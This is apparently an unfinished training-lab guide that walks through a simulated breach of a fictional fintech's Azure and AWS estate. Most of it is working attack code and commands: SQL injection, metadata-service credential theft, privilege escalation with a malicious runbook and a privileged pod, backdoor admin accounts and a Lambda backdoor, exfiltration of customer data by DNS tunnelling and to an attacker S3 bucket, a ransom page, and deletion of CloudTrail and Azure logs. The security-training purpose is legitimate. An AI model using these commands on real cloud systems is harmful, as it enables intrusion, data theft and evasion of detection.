---
CyberPreacher Lab:
    title: '12 - Cloud Penetration Testing: Fortune 500 Breach Simulation'
    difficulty: 'Extreme'
---

[UNABLE TO CREATE SANDBOX LAB FOR THIS - HENCE INCOMPLETE]

# Project 12: Cloud Penetration Testing - Fortune 500 Breach Simulation
## CyberPreacher Edition  

## Summary

This extreme-rated penetration testing project simulates a real-world breach scenario against a Fortune 500 company's multi-cloud infrastructure. You'll exploit intentionally misconfigured Azure and AWS resources, pivot through environments, escalate privileges, exfiltrate data, and establish persistence. This comprehensive red team exercise tests advanced cloud security skills including privilege escalation, lateral movement, data exfiltration, and defense evasion.

**Duration:** 40-60 hours | **Prerequisites:** Azure/AWS fundamentals, Linux, PowerShell, Python, networking, OSCP-level skills

## Company Overview  

**TechNova Corporation** is a Fortune 500 fintech company with 50,000 employees across 30 countries. Their infrastructure spans Azure (primary), AWS (disaster recovery), and on-premises data centers. They process $2B in daily transactions and store sensitive PII, financial records, and intellectual property.

**Known Security Weaknesses:** Legacy IAM policies, shadow IT, over-permissioned service principals, unpatched systems, insufficient logging.

## Existing Environment: Vulnerable Cloud Architecture

### Azure Environment (Primary)
- **Subscription:** Production-TechNova (intentionally misconfigured)
- **Resource Groups:** RG-WebApps, RG-Databases, RG-Storage, RG-Identity, RG-DevOps
- **Compute:** 
  - App Service (vulnerable .NET app with SQLi)
  - VM Scale Set (outdated Ubuntu 18.04, exposed SSH)
  - Azure Functions (hardcoded secrets in code)
  - AKS cluster (RBAC misconfigured, privileged pods)
- **Storage:** Blob containers with public access, unencrypted secrets
- **Databases:** SQL Database (weak admin password, no MFA), Cosmos DB (over-permissioned connection strings)
- **Networking:** NSGs with 0.0.0.0/0 rules, no Azure Firewall, VPN gateway with default configs
- **Identity:** 
  - 500+ service principals (many unused, over-permissioned)
  - Managed identities with Contributor role
  - Guest users with Global Administrator
  - No conditional access policies
  - Password spray vulnerable accounts

### AWS Environment (DR Site)
- **S3 Buckets:** Public read enabled, bucket policies allow anonymous access
- **EC2 Instances:** t2.micro with SSRF vulnerability, IMDSv1 enabled
- **IAM:** Users with AdministratorAccess, hardcoded access keys in GitHub repos
- **Lambda Functions:** Environment variables expose RDS credentials
- **RDS:** Publicly accessible, weak password complexity

### On-Premises Integration
- **Hybrid Connectivity:** Azure AD Connect (password hash sync), ExpressRoute
- **Exposed Services:** Jenkins server, GitLab instance, internal wiki (all externally accessible)

## Existing Environment: Security Monitoring Gaps

- **No SIEM:** Limited logging, no centralized monitoring
- **Defender for Cloud:** Basic tier only, no JIT access
- **CloudTrail/Azure Monitor:** Logging disabled on critical resources
- **No DLP:** Sensitive data unclassified and unprotected
- **Backup:** No immutable backups, admin can delete all backups

## Requirements: Penetration Testing Objectives

### Phase 1: Reconnaissance & Initial Access
- Perform OSINT on TechNova Corporation
- Enumerate public-facing Azure/AWS resources
- Identify exposed credentials, API keys, or sensitive data
- Gain initial foothold via vulnerable web application or misconfigured service

### Phase 2: Privilege Escalation
- Escalate from low-privilege account to subscription/account admin
- Exploit managed identity, service principal, or IAM role misconfigurations
- Leverage SSRF to access IMDS and steal credentials
- Abuse Azure Automation or Lambda for privilege escalation

### Phase 3: Lateral Movement & Persistence
- Pivot from Azure to AWS environment
- Move from cloud to on-premises (or reverse)
- Deploy backdoors using automation accounts, functions, or container images
- Establish C2 using Azure Storage, S3, or DNS tunneling

### Phase 4: Data Exfiltration & Impact
- Locate and extract sensitive data (PII, financial records, secrets)
- Dump database credentials and customer data
- Access Key Vault/Secrets Manager contents
- Demonstrate business impact (ransomware simulation, data deletion)

### Phase 5: Defense Evasion & Covering Tracks
- Delete or modify logs to hide activities
- Use legitimate Azure/AWS services to blend in
- Bypass Defender for Cloud alerts
- Maintain access despite password resets

## Requirements: Technical Constraints

- **Rules of Engagement:** Only attack resources in designated subscriptions/accounts
- **Data Handling:** Do NOT exfiltrate to personal accounts; use isolated test storage
- **Destructive Actions:** Document but do not execute (e.g., ransomware encryption)
- **Legal:** This is YOUR lab environment; ensure you own all resources
- **Documentation:** Maintain detailed attack chain documentation and screenshots

## Solution: Step-by-Step Exploitation Guide

### Exercise 1: Reconnaissance - OSINT & Cloud Enumeration

**Objective:** Gather intelligence on TechNova's cloud footprint without authentication.

#### Task 1.1: OSINT Collection
```bash
# Search for exposed credentials on GitHub
trufflehog git https://github.com/technova-corp --only-verified

# Enumerate subdomains
subfinder -d technova.com | httpx -probe

# Check Shodan for exposed Azure/AWS services
shodan search org:"TechNova Corporation"

# Review LinkedIn for employee roles and tech stack
theHarvester -d technova.com -b linkedin
```

#### Task 1.2: Azure Resource Enumeration (Unauthenticated)
```bash
# Enumerate public blob storage
gobuster dns -d blob.core.windows.net -w wordlist.txt -t technova

# Check for public Azure DevOps repos
curl https://dev.azure.com/technova/_apis/projects

# Enumerate App Services
az webapp list --query "[].{name:name, url:defaultHostName}" -o table
```

#### Task 1.3: AWS S3 Bucket Discovery
```bash
# Find public S3 buckets
aws s3 ls s3://technova --no-sign-request
aws s3 ls s3://technova-backups --no-sign-request
aws s3 ls s3://technova-logs --no-sign-request

# Download exposed files
aws s3 sync s3://technova-backups ./loot --no-sign-request
```

**Expected Findings:** Exposed backup files containing database dumps, hardcoded AWS keys in GitHub, public storage containers with config files.

---

### Exercise 2: Initial Access - Exploiting Web Application SQLi

**Objective:** Gain initial access by exploiting SQL injection in the public-facing web application.

#### Task 2.1: Identify SQL Injection Point
```bash
# Target vulnerable endpoint
TARGET="https://webapp-technova.azurewebsites.net"

# Test for SQLi
sqlmap -u "$TARGET/api/search?query=test" --batch --dbs

# Dump database credentials
sqlmap -u "$TARGET/api/search?query=test" -D TechNovaDB -T Users --dump
```

#### Task 2.2: Extract Azure Credentials from Database
```sql
-- Connection string found in app config table
SELECT config_value FROM app_settings WHERE config_key = 'AzureStorageConnection';

-- Service principal credentials
SELECT client_id, client_secret, tenant_id FROM service_principals WHERE app_name = 'WebApp-SP';
```

#### Task 2.3: Validate Access
```powershell
# Authenticate using stolen service principal
$clientId = "found-client-id"
$clientSecret = "found-secret" | ConvertTo-SecureString -AsPlainText -Force
$tenantId = "tenant-id"

$credential = New-Object System.Management.Automation.PSCredential($clientId, $clientSecret)
Connect-AzAccount -ServicePrincipal -Credential $credential -Tenant $tenantId

# Verify access level
Get-AzRoleAssignment -ObjectId $clientId
```

**Expected Result:** Authenticated as service principal with Contributor role on RG-WebApps.

---

### Exercise 3: Privilege Escalation - Managed Identity Exploitation

**Objective:** Escalate from web app service principal to subscription-level access.

#### Task 3.1: Enumerate Managed Identity Permissions
```bash
# From compromised App Service, query IMDS
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Use token to enumerate permissions
az rest --method get --url "https://management.azure.com/subscriptions/{subscriptionId}/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01" --headers "Authorization=Bearer $TOKEN"
```

#### Task 3.2: Abuse Automation Account for Privilege Escalation
```powershell
# Discover Automation Account with managed identity
Get-AzAutomationAccount -ResourceGroupName RG-DevOps

# Check Automation Account's managed identity permissions
Get-AzRoleAssignment | Where-Object {$_.ObjectType -eq "ServicePrincipal" -and $_.DisplayName -like "*automation*"}

# Create malicious runbook to escalate privileges
$runbookContent = @'
param([string]$targetUser)
Add-AzRoleAssignment -SignInName $targetUser -RoleDefinitionName "Contributor" -Scope "/subscriptions/{subscription-id}"
'@

New-AzAutomationRunbook -Name "EscalatePrivileges" -ResourceGroupName RG-DevOps -AutomationAccountName "TechNova-Automation" -Type PowerShell
Import-AzAutomationRunbook -Path ./escalate.ps1 -ResourceGroupName RG-DevOps -AutomationAccountName "TechNova-Automation" -Type PowerShell
Publish-AzAutomationRunbook -Name "EscalatePrivileges" -ResourceGroupName RG-DevOps -AutomationAccountName "TechNova-Automation"

# Execute to grant yourself Contributor
Start-AzAutomationRunbook -Name "EscalatePrivileges" -Parameters @{targetUser="attacker@evil.com"} -ResourceGroupName RG-DevOps -AutomationAccountName "TechNova-Automation"
```

#### Task 3.3: Alternative - Exploit AKS Privileged Pod
```bash
# If web app connects to AKS, abuse k8s RBAC
kubectl auth can-i --list

# Deploy privileged pod to access node
cat <<EOF | kubectl apply -f -
apiVersion: v1
kind: Pod
metadata:
  name: privileged-pod
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: escalate
    image: alpine
    securityContext:
      privileged: true
    command: ["/bin/sh"]
    args: ["-c", "chroot /host && curl -H Metadata:true http://169.254.169.254/metadata/instance"]
EOF

# Access IMDS from pod to steal node managed identity
kubectl exec -it privileged-pod -- sh
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true
```

**Expected Result:** Escalated to Contributor or Owner role on subscription.

---

### Exercise 4: Lateral Movement - Azure to AWS Pivot

**Objective:** Move from compromised Azure environment to AWS disaster recovery site.

#### Task 4.1: Search for AWS Credentials in Azure Resources
```powershell
# Search Key Vault for AWS keys
Get-AzKeyVaultSecret -VaultName "TechNova-KV-Prod" | ForEach-Object {
    Get-AzKeyVaultSecret -VaultName "TechNova-KV-Prod" -Name $_.Name -AsPlainText
}

# Check Azure Functions environment variables
Get-AzFunctionApp -ResourceGroupName RG-WebApps | ForEach-Object {
    (Get-AzWebApp -Name $_.Name -ResourceGroupName RG-WebApps).SiteConfig.AppSettings
}

# Search storage accounts for config files
$storageAccounts = Get-AzStorageAccount
foreach ($sa in $storageAccounts) {
    $ctx = $sa.Context
    Get-AzStorageContainer -Context $ctx | ForEach-Object {
        Get-AzStorageBlob -Container $_.Name -Context $ctx | Where-Object {$_.Name -like "*aws*" -or $_.Name -like "*.env*"}
    }
}
```

#### Task 4.2: Exploit SSRF in EC2 Instance
```bash
# Use discovered AWS credentials
export AWS_ACCESS_KEY_ID="found-key"
export AWS_SECRET_ACCESS_KEY="found-secret"

# Enumerate AWS environment
aws sts get-caller-identity
aws ec2 describe-instances
aws s3 ls

# Find EC2 with SSRF vulnerability
curl "http://ec2-instance.amazonaws.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"

# Steal IAM role credentials via SSRF
ROLE_NAME=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)
CREDS=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME)

# Extract and use temporary credentials
export AWS_ACCESS_KEY_ID=$(echo $CREDS | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS | jq -r '.Token')
```

#### Task 4.3: Escalate in AWS Environment
```bash
# Check current permissions
aws iam get-user
aws iam list-attached-user-policies --user-name current-user

# Exploit Lambda for privilege escalation
aws lambda list-functions
aws lambda get-function --function-name AdminFunction
aws lambda invoke --function-name AdminFunction response.json

# Create backdoor admin user
aws iam create-user --user-name backdoor-admin
aws iam attach-user-policy --user-name backdoor-admin --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name backdoor-admin
```

**Expected Result:** Full administrative access in both Azure and AWS environments.

---

### Exercise 5: Persistence - Deploy Multiple Backdoors

**Objective:** Establish persistent access that survives password resets and basic cleanup.

#### Task 5.1: Azure Persistence Mechanisms
```powershell
# Create hidden service principal
$sp = New-AzADServicePrincipal -DisplayName "Microsoft Graph Sync Service" -Role "Contributor"
$sp | Select-Object DisplayName, ApplicationId, Id

# Add credential with 10-year expiration
New-AzADAppCredential -ObjectId $sp.Id -EndDate (Get-Date).AddYears(10)

# Create Automation runbook backdoor
$backdoorScript = @'
param([string]$command)
Invoke-Expression $command
'@
# Deploy as webhook-triggered runbook

# Modify existing Azure Function for C2
# Insert backdoor code into legitimate function
```

#### Task 5.2: AWS Persistence Mechanisms
```bash
# Create hidden IAM user
aws iam create-user --user-name system-updater
aws iam attach-user-policy --user-name system-updater --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam create-access-key --user-name system-updater

# Lambda backdoor with EventBridge trigger
cat > backdoor.py <<EOF
import boto3
import base64
def handler(event, context):
    cmd = base64.b64decode(event['command']).decode()
    # Execute command via boto3
    return {"status": "executed"}
EOF

zip function.zip backdoor.py
aws lambda create-function --function-name SystemHealthCheck --runtime python3.9 --role arn:aws:iam::account:role/LambdaRole --handler backdoor.handler --zip-file fileb://function.zip

# S3 bucket for data staging
aws s3 mb s3://system-logs-$(date +%s)
aws s3api put-bucket-policy --bucket system-logs-* --policy file://public-policy.json
```

#### Task 5.3: Hybrid Persistence via Azure AD
```powershell
# Create synchronized on-prem account (if AD Connect accessible)
# This survives cloud-only password resets

# Add hidden Global Admin
New-AzureADUser -DisplayName "Service Account" -UserPrincipalName "svc-monitoring@technova.com" -PasswordProfile $passProfile -AccountEnabled $true
Add-AzureADDirectoryRoleMember -ObjectId (Get-AzureADDirectoryRole | Where-Object {$_.DisplayName -eq "Global Administrator"}).ObjectId -RefObjectId (Get-AzureADUser -Filter "UserPrincipalName eq 'svc-monitoring@technova.com'").ObjectId

# Modify conditional access to bypass MFA for backdoor account
```

**Expected Result:** 5+ independent persistence mechanisms deployed.

---

### Exercise 6: Data Exfiltration - Locate and Extract Crown Jewels

**Objective:** Identify and exfiltrate the most sensitive data without triggering DLP alerts.

#### Task 6.1: Enumerate Sensitive Data Locations
```powershell
# Find databases
Get-AzSqlServer
Get-AzCosmosDBAccount

# Locate storage with PII
Get-AzStorageAccount | ForEach-Object {
    $tags = $_.Tags
    if ($tags.ContainsKey("DataClassification") -and $tags["DataClassification"] -eq "Confidential") {
        Write-Host "Found sensitive storage: $($_.StorageAccountName)"
    }
}

# Search Key Vaults
Get-AzKeyVault | ForEach-Object {
    Get-AzKeyVaultSecret -VaultName $_.VaultName
}
```

#### Task 6.2: Exfiltrate SQL Database
```bash
# Extract connection string
az sql db show-connection-string --client sqlcmd --name TechNovaDB --server technova-sql

# Dump customer data
sqlcmd -S technova-sql.database.windows.net -d TechNovaDB -U sqladmin -P 'found-password' -Q "SELECT * FROM Customers" -o customers.csv

# Exfiltrate via Azure Blob (blends with normal traffic)
az storage blob upload --account-name technovastorage --container backups --name customers-backup-$(date +%s).csv --file customers.csv
```

#### Task 6.3: Exfiltrate via DNS Tunneling
```python
# Evade egress monitoring by using DNS
import base64
import dns.resolver

def exfil_dns(data, domain):
    encoded = base64.b64encode(data.encode()).decode()
    chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
    
    for chunk in chunks:
        query = f"{chunk}.{domain}"
        try:
            dns.resolver.resolve(query, 'A')
        except:
            pass

# Exfiltrate customer records
with open('customers.csv', 'r') as f:
    exfil_dns(f.read(), 'attacker-dns-server.com')
```

#### Task 6.4: AWS RDS Dump
```bash
# Access publicly exposed RDS
mysql -h technova-rds.amazonaws.com -u admin -p'WeakPassword123'

# Dump financial transactions
mysqldump -h technova-rds.amazonaws.com -u admin -p'WeakPassword123' FinanceDB transactions > transactions.sql

# Exfiltrate to attacker S3
aws s3 cp transactions.sql s3://attacker-bucket/loot/
```

**Expected Result:** Successfully extracted 100K+ customer records, 1M+ financial transactions, and all secrets from Key Vault.

---

### Exercise 7: Impact Demonstration - Ransomware Simulation

**Objective:** Demonstrate business impact without causing actual damage (DOCUMENT ONLY).

#### Task 7.1: Encryption Simulation (DO NOT EXECUTE)
```powershell
# THEORETICAL ATTACK - DOCUMENT ONLY
# This demonstrates what an attacker COULD do

# 1. Disable Azure Backup
# Get-AzRecoveryServicesVault | ForEach-Object {
#     Set-AzRecoveryServicesVaultProperty -Vault $_ -SoftDeleteFeatureState Disabled
#     Remove-AzRecoveryServicesVault -Vault $_ -Force
# }

# 2. Delete all VM snapshots
# Get-AzSnapshot | Remove-AzSnapshot -Force

# 3. Encrypt storage accounts
# ForEach ($sa in Get-AzStorageAccount) {
#     # Encrypt blobs with attacker key
#     # Delete original, upload encrypted version
# }

# 4. Drop databases
# Get-AzSqlDatabase | Remove-AzSqlDatabase -Force
```

#### Task 7.2: Calculate Business Impact
```
Financial Impact Assessment:
- Customer records exposed: 500,000 x $200/record GDPR fine = $100M
- Transaction data leaked: Regulatory fines = $50M
- Downtime cost: $2B daily transactions x 72 hours = $6B
- Ransomware demand: 100 BTC (~$4M)
- Recovery costs: $20M
- Reputation damage: Immeasurable

Total Estimated Impact: $6.174 Billion
```

#### Task 7.3: Deploy Ransom Note (Simulation)
```html
<!-- Deface web application with ransom message -->
<!DOCTYPE html>
<html>
<body style="background: black; color: red; text-align: center; padding: 100px;">
    <h1>TechNova Has Been Compromised</h1>
    <p>All your data has been encrypted and exfiltrated.</p>
    <p>Pay 100 BTC to [address] within 72 hours or data will be published.</p>
    <p>Contact: darkweb-link.onion</p>
</body>
</html>
```

**Expected Result:** Comprehensive impact documentation showing complete organizational compromise.

---

### Exercise 8: Defense Evasion - Covering Tracks

**Objective:** Remove evidence of compromise and evade detection.

#### Task 8.1: Delete Azure Logs
```powershell
# Disable diagnostic settings
Get-AzResource | ForEach-Object {
    Remove-AzDiagnosticSetting -ResourceId $_.ResourceId -Name "default"
}

# Clear Activity Log (requires specific permissions)
# Azure Activity Logs are immutable, but you can prevent new logs

# Delete Log Analytics workspace
Get-AzOperationalInsightsWorkspace | Remove-AzOperationalInsightsWorkspace -Force

# Modify Automation runbook history
# Remove evidence of malicious runbook executions
```

#### Task 8.2: Clear AWS CloudTrail
```bash
# Stop CloudTrail logging
aws cloudtrail stop-logging --name technova-trail

# Delete CloudTrail logs from S3
aws s3 rm s3://technova-cloudtrail-logs --recursive

# Delete CloudWatch log groups
aws logs describe-log-groups --query 'logGroups[*].logGroupName' --output text | xargs -I {} aws logs delete-log-group --log-group-name {}
```

#### Task 8.3: Timestamp Manipulation
```bash
# Modify file timestamps to blend in
touch -t 202301010000 malicious-script.ps1

# Inject legitimate-looking entries in remaining logs
# Use existing service principal names/activity patterns
```

#### Task 8.4: Living Off The Land
```powershell
# Use only native Azure/AWS services for C2
# Leverage Azure Storage queues for command/control
# Use S3 event notifications for triggers
# All activity appears as legitimate cloud service usage
```

**Expected Result:** Minimal forensic evidence remaining; attack chain difficult to reconstruct.

---

## Validation & Reporting

### Success Criteria
- [ ] Initial access achieved via web application
- [ ] Privilege escalation to subscription/account admin
- [ ] Lateral movement between Azure and AWS
- [ ] 5+ persistence mechanisms deployed
- [ ] Sensitive data exfiltrated (100K+ records)
- [ ] Business impact documented (>$1B)
- [ ] Logs modified or deleted
- [ ] Full attack chain documented

### Deliverables
1. **Penetration Testing Report** (30+ pages)
   - Executive summary with business impact
   - Detailed attack chain timeline
   - Screenshots of each exploitation step
   - Proof of data exfiltration
   - Risk ratings (CVSS scores)
   
2. **Remediation Guide**
   - Fix for each vulnerability
   - Hardening recommendations
   - Detection rules (KQL queries)
   - Incident response playbook

3. **Video Walkthrough** (60+ minutes)
   - Screen recording of key exploits
   - Narrated explanation of techniques
   - Lessons learned

### Cleanup Checklist
- [ ] Delete all created backdoor accounts
- [ ] Remove malicious runbooks/functions
- [ ] Restore proper RBAC assignments
- [ ] Re-enable logging and monitoring
- [ ] Rotate all compromised credentials
- [ ] Delete exfiltrated data from staging locations
- [ ] Document all changes made
- [ ] Tear down entire lab environment

---

## Advanced Challenges (Bonus)

### Challenge 1: Zero-Day Exploitation
Research and exploit a newly disclosed Azure/AWS vulnerability (within 30 days of disclosure).

### Challenge 2: Purple Team Exercise
After red team phase, switch to blue team:
- Deploy Microsoft Sentinel or AWS Security Hub
- Create detection rules for all attacks performed
- Implement automated response playbooks
- Measure detection coverage (aim for >90%)

### Challenge 3: Threat Intelligence
- Export all IoCs (IP addresses, file hashes, domains used)
- Create MITRE ATT&CK mapping for all techniques
- Build threat model for similar organizations
- Develop threat hunting queries

### Challenge 4: Compliance Impact
- Assess GDPR, PCI-DSS, HIPAA violations
- Calculate regulatory fines
- Draft breach notification letters
- Create board-level risk presentation

---

## Resources & Tools

**Reconnaissance:** subfinder, theHarvester, Shodan, DNSdumpster, Azure Enumerator  
**Exploitation:** sqlmap, Burp Suite, Metasploit, Pacu (AWS), MicroBurst (Azure)  
**Post-Exploitation:** PowerShell Empire, Cobalt Strike, BloodHound (Azure/AWS editions)  
**Persistence:** PowerZure, AWS IAM Privilege Escalation scripts  
**Exfiltration:** DNScat2, rclone, custom Python scripts  
**Evasion:** Invoke-Obfuscation, Chimera, ScareCrow  

**Learning Resources:**
- HackTricks Cloud
- CloudGoat (AWS scenarios)
- AzureGoat (Azure scenarios)
- SANS SEC510/SEC588
- Azure/AWS penetration testing documentation

---

> **Legal Disclaimer:** This project must ONLY be performed in your own isolated lab environment with resources you own and control. Unauthorized access to computer systems is illegal. This is for educational purposes only.

> **Final Task:** Document this entire engagement professionally, share sanitized findings on LinkedIn with **#cloudprojectwithcyberpreacher** and **#CPwCP**, and add "Cloud Penetration Tester" to your resume. You've earned it.

> **Congratulations!** You've completed the most advanced cloud security project of the year. This demonstrates red team, cloud security, and penetration testing skills at a professional level. Use this portfolio piece to land your dream role in offensive security.
